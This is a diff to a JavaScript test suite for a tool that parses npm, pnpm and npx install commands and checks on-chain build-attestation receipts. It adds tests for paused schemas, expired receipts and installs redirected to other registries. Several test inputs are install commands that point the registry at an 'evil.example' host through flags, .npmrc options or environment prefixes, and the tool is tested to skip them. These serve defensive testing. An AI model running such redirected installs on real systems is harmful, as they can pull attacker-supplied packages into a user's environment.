@@ -139,8 +139,38 @@ test("wrong owner, wrong credential, wrong schema, wrong nonce, expired", async 
   assert.match((await read(mk({ signer: "5aaxnUvsyAcY4KdDAxscLsXtyU9cYQHzXhPEzqV2daGh" }))).error, /not signed by Sato Hub's authority/);
   assert.match((await read(mk({ nonce: getAddressDecoder().decode(Buffer.alloc(32, 7)) }))).error, /nonce does not match/);
   assert.match((await read(mk({ subject_id: "npm:other" , nonce: receiptNonce(key.subject_id, key.version) }))).error, /different subject or version/);
-  assert.deepEqual(await read(mk({ expiry: 1_700_000_000 }), {}, () => 1_800_000_000_000), { ok: true, receipt: null, note: "the attestation has expired" });
+  assert.equal(owner.untrusted, true, "an account that fails a check is its own answer, not an unreadable chain");
+  for (const o of [{ credential: "5aaxnUvsyAcY4KdDAxscLsXtyU9cYQHzXhPEzqV2daGh" }, { signer: "5aaxnUvsyAcY4KdDAxscLsXtyU9cYQHzXhPEzqV2daGh" }]) {
+    assert.equal((await read(mk(o))).untrusted, true, JSON.stringify(o));
+  }
+  assert.deepEqual(await read(mk({ expiry: 1_700_000_000 }), {}, () => 1_800_000_000_000), { ok: true, receipt: null, expired: true, note: "expired 2023-11-14" });
   assert.ok((await read(mk({ expiry: 1_900_000_000 }), {}, () => 1_800_000_000_000)).receipt, "before its expiry it is a reading");
+});
+
+test("a paused schema: an attestation under it is not a Sato Hub receipt (schema paused); no account is still no reading", async () => {
+  const w = await makeWorld();
+  const key = { subject_id: "npm:mock-same", version: "1.0.0" };
+  const address = await receiptAddress(key.subject_id, key.version, MAIN);
+  const paused = Buffer.from(recorded.schema_b64, "base64");
+  paused[paused.length - 2] = 1; // isPaused (then the version byte)
+  assert.equal(decodeSchemaAccount(new Uint8Array(paused)).isPaused, true);
+  const out = await readReceiptsFromChain(rpcFrom({ [MAIN.schema]: paused.toString("base64"), [address]: w.accounts[address] }), MAIN, [key, { subject_id: "npm:none", version: "1.0.0" }]);
+  const r = out.get("npm:mock-same@1.0.0");
+  assert.equal(r.untrusted, true);
+  assert.equal(r.error, "schema paused");
+  assert.deepEqual(out.get("npm:none@1.0.0"), { ok: true, receipt: null });
+});
+
+test("an expired receipt says a receipt existed and has expired, never that none exists", async () => {
+  const w = await makeWorld();
+  const address = await receiptAddress("npm:mock-same", "1.0.0", MAIN);
+  w.accounts[address] = encodeAttestation({ subject_id: "npm:mock-same", version: "1.0.0", digest: "00".repeat(32), expiry: 1_700_000_000 });
+  const rep = await checkBuilds("npm i mock-same@1.0.0", { fetch: w.fetch, now: () => 1_800_000_000_000 });
+  assert.equal(rep.receipts[0].status, "receipt_expired");
+  assert.equal(rep.receipts[0].receipt, null);
+  const text = renderReceipts(rep);
+  assert.match(text, /a receipt existed for this build but it has expired/);
+  assert.doesNotMatch(text, /No receipt exists/);
 });
 
 test("a schema that is missing, foreign or of another credential is an error, never a quiet no-reading", async () => {
@@ -176,7 +206,11 @@ test("install commands: npm, pnpm, yarn, bun, npx; scoped names; flags ignored",
   assert.deepEqual(names("npx --yes @jup-ag/cli@0.10.1 swap"), ["@jup-ag/cli@0.10.1"]);
   assert.deepEqual(names("pnpm dlx create-thing@2.0.0"), ["create-thing@2.0.0"]);
   assert.deepEqual(names("npx -p pkg-a@1.0.0 -p pkg-b run-it"), ["pkg-a@1.0.0", "pkg-b@"]);
-  assert.deepEqual(names("npm i --registry https://r.example/ --prefix /tmp/x real-pkg@4.5.6"), ["real-pkg@4.5.6"], "a flag's value is not a package");
+  assert.deepEqual(names("npm i --cache /tmp/c --prefix /tmp/x real-pkg@4.5.6"), ["real-pkg@4.5.6"], "a flag's value is not a package");
+  // With --registry the packages are skipped (M3), and its value is still not taken for a package.
+  const reg = parseInstallCommand("npm i --registry https://r.example/ --prefix /tmp/x real-pkg@4.5.6");
+  assert.deepEqual(reg.packages, []);
+  assert.deepEqual(reg.skipped, [{ spec: "real-pkg@4.5.6", reason: "installs from another registry" }]);
   assert.deepEqual(names("npm i -g pkg@1.0.0-beta.2"), ["pkg@1.0.0-beta.2"]);
   assert.deepEqual(names("cd app && sudo npm i a@1.0.0; npm i b@2.0.0 | tee log"), ["a@1.0.0", "b@2.0.0"]);
   assert.deepEqual(names('npm i "quoted@1.0.0"'), ["quoted@1.0.0"]);
@@ -203,6 +237,43 @@ test("things that are not an npm install name no package, and nothing is run", (
     assert.deepEqual(r.packages, [], JSON.stringify(cmd));
   }
   assert.equal(parseInstallCommand("npm run build -- pkg@1.0.0").packages.length, 0);
+});
+
+test("an install from another registry (flag, config file or env prefix) is skipped, never looked up", () => {
+  const cases = [
+    "npm i --registry https://evil.example/ foo@1.0.0",
+    "npm i --registry=https://evil.example/ foo@1.0.0",
+    "npm i --reg=https://evil.example/ foo@1.0.0",
+    "npm i --userconfig ./x.npmrc foo@1.0.0",
+    "npm i --userconfig=./x.npmrc foo@1.0.0",
+    "npm i --@acme:registry=https://evil.example/ foo@1.0.0",
+    "npm_config_registry=https://evil.example/ npm i foo@1.0.0",
+    "NPM_CONFIG_REGISTRY=https://evil.example/ npm i foo@1.0.0",
+    "Npm_Config_Registry=https://evil.example/ npx -y foo@1.0.0",
+    "env NPM_CONFIG_REGISTRY=https://evil.example/ pnpm add foo@1.0.0",
+    "export NPM_CONFIG_REGISTRY=https://evil.example/ && npm i foo@1.0.0",
+    "pnpm add foo@1.0.0 --registry https://evil.example/",
+  ];
+  for (const cmd of cases) {
+    const r = parseInstallCommand(cmd);
+    assert.deepEqual(r.packages, [], cmd);
+    assert.ok(r.skipped.some((s) => s.spec === "foo@1.0.0" && s.reason === "installs from another registry"), cmd);
+  }
+  // A registry flag on one command does not touch another; a plain prefix applies to its own command only.
+  const mixed = parseInstallCommand("npm i a@1.0.0 && npm i --registry=https://x.example/ b@1.0.0");
+  assert.deepEqual(mixed.packages.map((p) => p.name), ["a"]);
+  const prefixed = parseInstallCommand("NPM_CONFIG_REGISTRY=https://x.example/ npm i b@1.0.0; npm i a@1.0.0");
+  assert.deepEqual(prefixed.packages.map((p) => p.name), ["a"]);
+});
+
+test("a redirected install makes no registry or chain request, and the output notes .npmrc", async () => {
+  const w = await makeWorld();
+  const rep = await checkBuilds("npm i --registry=https://evil.example/ mock-same@1.0.0", { fetch: w.fetch });
+  assert.deepEqual(rep.receipts, []);
+  assert.equal(w.calls.length, 0);
+  assert.match(renderReceipts(rep), /Not looked up: mock-same@1\.0\.0 \(installs from another registry\)/);
+  const plain = renderReceipts(await checkBuilds("npm i mock-same@1.0.0", { fetch: w.fetch }));
+  assert.match(plain, /\.npmrc can redirect an install to another registry/);
 });
 
 test("more than ten packages: the rest are listed, not downloaded", () => {
@@ -324,9 +395,12 @@ test("an account at the receipt address that is not a Sato Hub receipt is an err
   const address = await receiptAddress("npm:mock-same", "1.0.0", MAIN);
   w.owners = { [address]: "11111111111111111111111111111111" };
   const rep = await checkBuilds("npm i mock-same@1.0.0", { fetch: w.fetch });
-  assert.equal(rep.receipts[0].status, "chain_unreadable");
+  assert.equal(rep.receipts[0].status, "not_a_sato_receipt");
   assert.match(rep.receipts[0].error, /not owned by the SAS program/);
   assert.equal(rep.receipts[0].receipt, null);
+  const text = renderReceipts(rep);
+  assert.match(text, /an account exists at the receipt address but it is not a Sato Hub receipt/);
+  assert.doesNotMatch(text, /could not be read/);
 });
 
 test("the registry serving bytes that fail its own integrity: no digest, no comparison", async () => {
@@ -422,7 +496,8 @@ test("CLI --json: a stable shape, receipts first, Sato Check's answer under sato
   const r = cli(["check", "npm i mock-same@1.0.0 mock-diff@1.0.0 mock-none@1.0.0 mock-latest ./local", "--json"]);
   assert.equal(r.status, 0, r.stderr);
   const j = JSON.parse(r.stdout);
-  assert.deepEqual(Object.keys(j), ["command", "receipts", "skipped", "deployment", "rpc_host", "sato_hub_check"]);
+  assert.deepEqual(Object.keys(j), ["command", "receipts", "skipped", "deployment", "rpc_host", "registry_note", "sato_hub_check"]);
+  assert.match(j.registry_note, /\.npmrc can redirect/);
   assert.equal(j.command, "npm i mock-same@1.0.0 mock-diff@1.0.0 mock-none@1.0.0 mock-latest ./local");
   assert.deepEqual(j.deployment, { cluster: "mainnet-beta", credential: MAIN.credential, schema: MAIN.schema, authority: MAIN.authority, program: SAS_PROGRAM_ID });
   assert.deepEqual(j.receipts.map((x) => x.status), ["same_build", "different_build", "no_reading", "same_build"]);
